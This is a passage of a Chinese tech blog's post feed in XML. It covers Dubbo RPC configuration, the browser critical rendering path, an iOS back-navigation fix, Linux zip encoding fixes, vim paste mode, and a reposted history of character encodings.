class="string">&quot;com.ssm.iservice.IPersonService&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>调用远程服务<br>配置完成后，我们就可以像使用本地 bean 一样，使用 rpc 的 service；<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    IPersonService personService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index.html&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        RpcContext.getContext().setAttachment(<span class="string">&quot;index&quot;</span>, <span class="string">&quot;1&quot;</span>);<span class="comment">//测试ThreadLocal</span></span><br><span class="line">        List&lt;Person&gt; list = personService.listAll();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;command&quot;</span>,list);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>至此，单机运行的 rpc 服务已搭建完成。</p>
<p>代码传送文 <a href="https://github.com/yelog/ssm">ssm</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>[译]理解浏览器关键渲染路径</title>
    <url>//understanding-the-critical-rendering-path</url>
    <content><![CDATA[<p>当一个浏览器接收到从服务器发来的html页面，在渲染并呈现到屏幕上之前，有很多步骤要做。浏览器渲染页面需要做的一系列行为被称作“关键渲染路径（Critical Rendering Path 简称CRP）”。</p>
<p><code>CRP</code> 的知识对于如何提升网站性能是相当有用的。<code>CRP</code>有6个步骤：</p>
<ol>
<li>构建DOM树</li>
<li>构建CSSOM树</li>
<li>运行JavaScript</li>
<li>创建渲染树</li>
<li>生成布局</li>
<li>绘制页面<br><img src="http://img.saodiyang.com/FlJb4QEGB2Km-q9PYHMVe4ic37sz.png" class="lazyload" data-srcset="http://img.saodiyang.com/FlJb4QEGB2Km-q9PYHMVe4ic37sz.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="CRP的6个步骤"></li>
</ol>
<h2 id="构建DOM树"><a href="#构建DOM树" class="headerlink" title="构建DOM树"></a>构建DOM树</h2><p>DOM（Document Object Model）树是一个表示整个解析过的HTML页面的对象，从根节点<code>&lt;html&gt;</code>开始，会创建页面中的每个 元素/文本 节点。嵌套在其他元素中的元素作为字节点，每个节点都包含了其所有的元素属性，例如： 一个<code>&lt;a&gt;</code>节点将有 <code>href</code> 属性与其关联。</p>
<p>举个例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Understanding the Critical Rendering Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Understanding the Critical Rendering Path<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Introduction<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">small</span>&gt;</span>Copyright 2017<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>上面的 HTML 将会被解析成下面的DOM树<br><img src="http://img.saodiyang.com/Fq6vahHSu_NZGyeWGuhZ8dFmBS0O.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fq6vahHSu_NZGyeWGuhZ8dFmBS0O.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="DOM树"><br>HTML的优点在于它不必等待整个页面加载完成才呈现页面，可以解析一部分，显示一部分。但是像CSS、JavaScript等其他资源会阻止页面渲染。</p>
<h2 id="构建CSSOM树"><a href="#构建CSSOM树" class="headerlink" title="构建CSSOM树"></a>构建CSSOM树</h2><p>CSSOM（CSS Object Model） 是一个跟DOM相关的样式对象。它跟DOM的表示方法是相似的，但是不论显式声明还是隐式继承，每个节点都存在关联样式。</p>
<p>In the style.css file from the document mentioned above, we have the folowing styles<br>在上面提到的html页面的<code>style.css</code>中的样式如下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123; <span class="attribute">font-size</span>: <span class="number">18px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123; <span class="attribute">color</span>: plum; &#125;  </span><br><span class="line"><span class="selector-tag">h1</span> &#123; <span class="attribute">font-size</span>: <span class="number">28px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">main</span> &#123; <span class="attribute">color</span>: firebrick; &#125;  </span><br><span class="line"><span class="selector-tag">h2</span> &#123; <span class="attribute">font-size</span>: <span class="number">20px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">footer</span> &#123; <span class="attribute">display</span>: none; &#125;  </span><br></pre></td></tr></table></figure>
<p>它会被构建成下面的CSSOM树<br><img src="http://img.saodiyang.com/FqMiZIUxvPBV4X-PnDFh6iGrdxy0.png" class="lazyload" data-srcset="http://img.saodiyang.com/FqMiZIUxvPBV4X-PnDFh6iGrdxy0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="CSSOM树"><br>CSS 被认为是 “渲染阻塞资源”，它意味着如果不首先完全解析资源，渲染树是无法构建的。CSS由于它的层叠继承的性质，不能像HTML一样解析一部分，显示一部分。定义在文档后面的样式会覆盖或改写之前定义的样式，因为在整个样式表都被解析之前，如果我们使用了在样式表中较早定义的样式，那错误的样式将被应用。这意味着CSS必须被全部解析之后，才能开始下一步。</p>
<p>如果CSS文件适用于当前设备的话，仅仅只是会阻塞渲染。<code>&lt;link rel=&quot;stylesheet&quot;&gt;</code>标签可以使用<code>media</code>属性，用来指定特定样式宽度的特定媒体查询。</p>
<p>举个例子，如果我们有一个包含媒体属性<code>orientation:landscape</code>的样式，我们使用纵向模式（portrait mode）查看页面，这个资源将不会阻塞渲染。</p>
<p>CSS 也会导致脚本阻塞。这是因为JavaScript文件必须等待CSSOM被构建后才能运行。</p>
<h2 id="运行JavaScript"><a href="#运行JavaScript" class="headerlink" title="运行JavaScript"></a>运行JavaScript</h2><p>JavaScript被认为是<code>解析阻塞资源</code>，这意味着HTML的解析会被JavaScript阻塞。</p>
<p>当解析器解析到 <code>&lt;script&gt;</code> 标签时，无论该资源是内部还是外链的都会停止解析，先去下载资源。这也是为什么，当页面内有引用JavaScript文件时，引用标签要放到可视元素之后了。</p>
<p>为避免JavaScript解析阻塞，它可以通过设定 async 属性来要求其异步加载。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="keyword">async</span> src=<span class="string">&quot;script.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="创建渲染树"><a href="#创建渲染树" class="headerlink" title="创建渲染树"></a>创建渲染树</h2><p>渲染树是DOM和CSSOM的结合体，它代表最终会渲染在页面上的元素的结构对象。这意味着它只关注可见内容，对于被隐藏或者CSS属性 display:none 的属性，不会被包含在结构内。</p>
<p>使用上面例子的DOM和CSSOM，渲染树被创建如下：<br><img src="http://img.saodiyang.com/FvhQ0k653cDvORFIiEbYxufNjZa4.png" class="lazyload" data-srcset="http://img.saodiyang.com/FvhQ0k653cDvORFIiEbYxufNjZa4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="渲染树"></p>
<h2 id="生成布局"><a href="#生成布局" class="headerlink" title="生成布局"></a>生成布局</h2><p>布局决定了浏览器视窗的大小,它提供了上下文依赖的CSS样式，如百分比或窗口的单位。视窗尺寸通常通过 <code>&lt;head&gt;</code> 标签中的 <code>&lt;meta&gt;</code> 中的 viewport 设定来决定。如果不存在该标签，则通常默认为 980px</p>
<p>例如，最常用的 <code>meta veiwport</code> 的值将会被设置为和设备宽度相符：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>如果用户访问网页的设备宽度为1000px。然后整体视窗尺寸就会基于这个宽度值了，比如 50% 就是500px, 10vw 就是100px 等等。</p>
<h2 id="绘制页面"><a href="#绘制页面" class="headerlink" title="绘制页面"></a>绘制页面</h2><p>最后，在绘制页面步骤。页面上的所有可见内容都会被转换为像素并呈现在屏幕上。</p>
<p>具体的绘制时间跟DOM数以及应用的样式有关。有些样式会花费更多的执行时间，比如复杂的渐变背景图片所需要的计算时间远超过简单固定背景色。</p>
<h2 id="整合所有"><a href="#整合所有" class="headerlink" title="整合所有"></a>整合所有</h2><p>想要看到关键渲染路径的执行流程，可以使用DevTools，在Chrome中，它是根据时间轴展示的。</p>
<p>举个例子, 上面的页面加入<code>&lt;script&gt;</code>标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Understanding the Critical Rendering Path<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Understanding the Critical Rendering Path<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Introduction<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Lorem ipsum dolor sit amet<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">small</span>&gt;</span>Copyright 2017<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>可以看关于页面加载时的事件日志，以下是我们获得的：<br><img src="http://img.saodiyang.com/Fro6Rduywm-txP3EEtak-E5T826l.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fro6Rduywm-txP3EEtak-E5T826l.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="时间轴"></p>
<ol>
<li><strong>Send Request</strong> - 发送到index.html的GET请求</li>
<li><strong>Parse HTML</strong> and <strong>Send Request</strong> - 开始解析HTML并构建DOM，然后发送 GET 请求style.css和main.js</li>
<li><strong>Parse Stylesheet</strong> - 根据 style.css 创建的CSSOM</li>
<li><strong>Evaluate Script</strong> - 执行 main.js</li>
<li><strong>Layout</strong> - 基于HTML的元视窗标签，生成布局</li>
<li><strong>Paint</strong> - 绘制网页<br>基于这些信息，我们可以知道如何优化关键渲染路径。</li>
</ol>
<p>原文： <a href="https://bitsofco.de/understanding-the-critical-rendering-path/">Understanding the Critical Rendering Path</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>translation</tag>
      </tags>
  </entry>
  <entry>
    <title>解决iphone下后退不执行js的问题</title>
    <url>//iphone-bf-no-run-js</url>
    <content><![CDATA[<h2 id="直接上解决方法"><a href="#直接上解决方法" class="headerlink" title="直接上解决方法"></a>直接上解决方法</h2><p>不论页面是否被缓存，都会触发 <code>pageshow</code>，所以后退后需要执行的方法可以都放在下面事件内：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;pageshow&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;on pageshow&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>浏览器缓存行为</code> 的详细介绍可以参考： <a href="#">Post not found: bf-cache</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>大前端</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>解决linux下zip文件解压乱码</title>
    <url>//%E8%A7%A3%E5%86%B3linux%E4%B8%8Bzip%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%B1%E7%A0%81</url>
    <content><![CDATA[<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于zip格式并没有指定编码格式，Windows下生成的zip文件中的编码是GBK/GB2312等，因此，导致这些zip文件在Linux下解压时出现乱码问题，因为Linux下的默认编码是UTF8。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用7z解压。</p>
<ol>
<li><p>安装p7zip和convmv</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fedora</span></span><br><span class="line">$ su -c <span class="string">&#x27;yum install p7zip convmv&#x27;</span></span><br><span class="line"><span class="comment"># ubuntu</span></span><br><span class="line">$ sudo apt-get install p7zip convmv</span><br></pre></td></tr></table></figure></li>
<li><p>执行一下命令解压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用7z解压缩</span></span><br><span class="line">$ LANG=C 7za x your-zip-file.zip</span><br><span class="line"><span class="comment"># 递归转码</span></span><br><span class="line">$ convmv -f GBK -t utf8 --notest -r .</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title>解决粘贴到vim缩进错乱问题</title>
    <url>//vim-paste</url>
    <content><![CDATA[<h2 id="遇见"><a href="#遇见" class="headerlink" title="遇见"></a>遇见</h2><p>当我使用vim，想要粘贴下面这段脚本到 xx.sh 文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[37m pay 参数1 [参数2] \033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$2</span> ]; <span class="keyword">then</span></span><br><span class="line">            filename = <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[37m 缺少关键词，通过&#x27;pay help&#x27;查看帮助信息 \033[0m&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>却出现了错乱,如下图所示<br><img src="http://img.saodiyang.com/FoIefs-sorNDjfPD69gH05is3tc5.png" class="lazyload" data-srcset="http://img.saodiyang.com/FoIefs-sorNDjfPD69gH05is3tc5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="缩进乱掉"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>vim 没有相应的程序来处理这个从其他应用复制粘贴的过程，所以Vim通过插入键盘输入的buffer来模拟这个粘贴的过程，这个时候Vim会以为这是用户输入的。</p>
<p>所以问题是：当上一行结束，光标进入下一行时Vim会自动以上一行的的缩进为初始位置。这样就会破坏原始文件的缩进。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>经过一番google，发现vim提供了 <code>paste</code> 选项，进入 paste 模式后，就可以正常缩进了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入 paste 模式</span></span><br><span class="line">:<span class="built_in">set</span> paste</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出 paste 模式</span></span><br><span class="line">:<span class="built_in">set</span> nopaste</span><br></pre></td></tr></table></figure>
<p><img src="http://img.saodiyang.com/FpHOECFUPpgkJBKhKE_wcRYvPJ81.png" class="lazyload" data-srcset="http://img.saodiyang.com/FpHOECFUPpgkJBKhKE_wcRYvPJ81.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="缩进正常"></p>
<p>如果不想每次都执行这个命令，可以在 <code>～/.vimrc</code> 中添加一行配置 <code>set pastetoggle=&lt;F12&gt;</code> ，这样就可以通过F12快速在paste模式中切换。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>[转]字符编解码的故事（ASCII，ANSI，Unicode，Utf-8区别）</title>
    <url>//ascii-ansi-unicode-utf-8%EF%BC%89</url>
    <content><![CDATA[<p>很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们认为8个开关状态作为原子单位很好，于是他们把这称为”字节”。</p>
<p>再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出更多的状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为”计算机”。</p>
<p>开始计算机只在美国用。八位的字节一共可以组合出256（2的8次方）种不同的状态。</p>
<p>他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端设备或者打印机遇上这些约定好的字节时，就要做一些约定的动作。遇上 00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0x1b, 打印机就打印反白的字，对于终端就用彩色显示字母。他们看到这样很好，于是就把这些0x20（十进制32）以下的字节状态称为”控制码”。</p>
<p>他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的 文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做 ANSI 的”Ascii”编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的ASCII方案来保存英文文字。</p>
<p>后来，就像建造巴比伦塔一样，世界各地的都开始使用计算机，但是很多国家用的不是英文，他们用到的许多字母在ASCII中根本没有，为了也可以在计算机中保存他们的文字，他们决定采用127号之后的空位来表示这些新的字母、符号，还加入了很多画表格时需要用下到的横线、竖线、交叉等形状，一直把序号编到了最后一个状态255。从128到255这一页的字符集被称”扩展字符集”。从此之后，贪婪的人类再没有新的状态可以用了，美帝国主义可能没有想到还有第三世界国家的人们也希望可以用到计算机吧！</p>
<p>等中国人们得到计算机时，已经没有可以利用的字节状态来表示汉字，况且有6000多个常用汉字需要保存呢。但是这难不倒智慧的中国人民，我们不客气地把那些127号之后的奇异符号们直接取消掉，并且规定：一个小于127的字符的意义与原来相同，但两个大于127的字符连在一起时，就表示一个汉字，前面的一个字节（他称之为高字节）从0xA1用到 0xF7，后面一个字节（低字节）从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在 ASCII 里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的”全角”字符，而原来在127号以下的那些就叫”半角”字符了。</p>
<p>中国人民看到这样很不错，于是就把这种汉字方案叫做”GB2312”。GB2312 是对 ASCII 的中文扩展。</p>
<p>但是中国的汉字太多了，我们很快就就发现有许多人的人名没有办法在这里打出来，特别是某些很会麻烦别人的国家领导人（如朱镕基的“镕”字）。于是我们不得不继续把 GB2312 没有用到的码位找出来老实不客气地用上。</p>
<p>后来还是不够用，于是干脆不再要求低字节一定是127号之后的内码，只要第一个字节是大于127就固定表示这是一个汉字的开始，不管后面跟的是不是扩展字符集里的内容。结果扩展之后的编码方案被称为 GBK 标准，GBK 包括了 GB2312 的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。</p>
<p>后来少数民族也要用电脑了，于是我们再扩展，又加了几千个新的少数民族的字，GBK 扩成了 GB18030。从此之后，中华民族的文化就可以在计算机时代中传承了。</p>
<p>中国的程序员们看到这一系列汉字编码的标准是好的，于是通称他们叫做 “DBCS”（Double Byte Charecter Set 双字节字符集）。在DBCS系列标准里，最大的特点是两字节长的汉字字符和一字节长的英文字符并存于同一套编码方案里，因此他们写的程序为了支持中文处理，必须要注意字串里的每一个字节的值，如果这个值是大于127的，那么就认为一个双字节字符集里的字符出现了。那时候凡是受过加持，会编程的计算机僧侣们都要每天念下面这个咒语数百遍：</p>
<p>“一个汉字算两个英文字符！一个汉字算两个英文字符……”</p>
<p>因为当时各个国家都像中国这样搞出一套自己的编码标准，结果互相之间谁也不懂谁的编码，谁也不支持别人的编码，连大陆和台湾这样只相隔了150海里，使用着同一种语言的兄弟地区，也分别采用了不同的 DBCS 编码方案——当时的中国人想让电脑显示汉字，就必须装上一个”汉字系统”，专门用来处理汉字的显示、输入的问题，但是那个台湾的愚昧封建人士写的算命程序就必须加装另一套支持 BIG5 编码的什么”倚天汉字系统”才可以用，装错了字符系统，显示就会乱了套！这怎么办？而且世界民族之林中还有那些一时用不上电脑的穷苦人民，他们的文字又怎么办？</p>
<p>真是计算机的巴比伦塔命题啊！</p>
<p>正在这时，大天使加百列及时出现了——一个叫 ISO （国际标谁化组织）的国际组织决定着手解决这个问题。他们采用的方法很简单：废了所有的地区性编码方案，重新搞一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它”Universal Multiple-Octet Coded Character Set”，简称 UCS, 俗称 “UNICODE”。</p>
<p>UNICODE 开始制订时，计算机的存储器容量极大地发展了，空间再也不成为问题了。于是 ISO 就直接规定必须用两个字节，也就是16位来统一表示所有的字符，对于ascii里的那些”半角”字符，UNICODE 包持其原编码不变，只是将其长度由原来的8位扩展为16位，而其他文化和语言的字符则全部重新统一编码。由于”半角”英文符号只需要用到低8位，所以其高 8位永远是0，因此这种大气的方案在保存英文文本时会多浪费一倍的空间。</p>
<p>这时候，从旧社会里走过来的程序员开始发现一个奇怪的现象：他们的strlen函数靠不住了，一个汉字不再是相当于两个字符了，而是一个！是 的，从 UNICODE 开始，无论是半角的英文字母，还是全角的汉字，它们都是统一的”一个字符”！同时，也都是统一的”两个字节”，请注意”字符”和”字节”两个术语的不同， “字节”是一个8位的物理存贮单元，而”字符”则是一个文化相关的符号。在UNICODE 中，一个字符就是两个字节。一个汉字算两个英文字符的时代已经快过去了。</p>
<p>从前多种字符集存在时，那些做多语言软件的公司遇上过很大麻烦，他们为了在不同的国家销售同一套软件，就不得不在区域化软件时也加持那个双字节字符集咒语，不仅要处处小心不要搞错，还要把软件中的文字在不同的字符集中转来转去。UNICODE 对于他们来说是一个很好的一揽子解决方案，于是从 Windows NT 开始，MS 趁机把它们的操作系统改了一遍，把所有的核心代码都改成了用 UNICODE 方式工作的版本，从这时开始，WINDOWS 系统终于无需要加装各种本土语言系统，就可以显示全世界上所有文化的字符了。</p>
<p>但是，UNICODE 在制订时没有考虑与任何一种现有的编码方案保持兼容，这使得 GBK 与UNICODE 在汉字的内码编排上完全是不一样的，没有一种简单的算术方法可以把文本内容从UNICODE编码和另一种编码进行转换，这种转换必须通过查表来进行。</p>
<p>如前所述，UNICODE 是用两个字节来表示为一个字符，他总共可以组合出65535不同的字符，这大概已经可以覆盖世界上所有文化的符号。如果还不够也没有关系，ISO已经准备了UCS-4方案，说简单了就是四个字节来表示一个字符，这样我们就可以组合出21亿个不同的字符出来（最高位有其他用途），这大概可以用到银河联邦成立那一天吧！</p>
<p>UNICODE 来到时，一起到来的还有计算机网络的兴起，UNICODE 如何在网络上传输也是一个必须考虑的问题，于是面向传输的众多 UTF（UCS Transfer Format）标准出现了，顾名思义，UTF8就是每次8个位传输数据，而UTF16就是每次16个位，只不过为了传输时的可靠性，从UNICODE到 UTF时并不是直接的对应，而是要过一些算法和规则来转换。</p>
<p>受到过网络编程加持的计算机僧侣们都知道，在网络里传递信息时有一个很重要的问题，就是对于数据高低位的解读方式，一些计算机是采用低位先发送的方法，例如我们PC机采用的 INTEL 架构；而另一些是采用高位先发送的方式。在网络中交换数据时，为了核对双方对于高低位的认识是否是一致的，采用了一种很简便的方法，就是在文本流的开始时向对方发送一个标志符——如果之后的文本是高位在位，那就发送”FEFF”，反之，则发送”FFFE”。不信你可以用二进制方式打开一个UTF-X格式的文件，看看开头两个字节是不是这两个字节？</p>
<p>下面是Unicode和UTF-8转换的规则</p>
